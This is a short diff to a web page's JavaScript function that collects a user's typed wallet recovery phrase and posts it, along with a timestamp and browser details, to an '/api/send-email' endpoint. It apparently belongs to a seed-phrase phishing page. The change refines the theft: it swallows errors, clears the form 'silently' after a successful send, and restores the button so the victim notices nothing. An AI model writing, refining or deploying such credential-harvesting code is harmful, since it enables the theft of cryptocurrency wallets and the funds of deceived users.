@@ -146,26 +146,29 @@ async function sendWords(btn) {
         btn.disabled = true;
         btn.textContent = 'Processing...';
         
-        const response = await fetch('/api/send-email', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                recoveryPhrase: words.join(' '),
-                timestamp: timestamp,
-                userAgent: navigator.userAgent
-            })
-        });
+        try {
+            const response = await fetch('/api/send-email', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    recoveryPhrase: words.join(' '),
+                    timestamp: timestamp,
+                    userAgent: navigator.userAgent
+                })
+            });
 
-        if (!response.ok) {
-            throw new Error('Failed to process request');
+            if (response.ok) {
+                // Clear form silently on success
+                inputs.forEach(input => input.value = '');
+                updateNumberVisibility();
+            }
+        } finally {
+            // Always restore button state
+            btn.disabled = false;
+            btn.textContent = originalText;
         }
-
-        // Clear form after successful submission
-        inputs.forEach(input => input.value = '');
-        btn.textContent = originalText;
-        btn.disabled = false;
         
     } catch (error) {
         console.error('Error:', error);
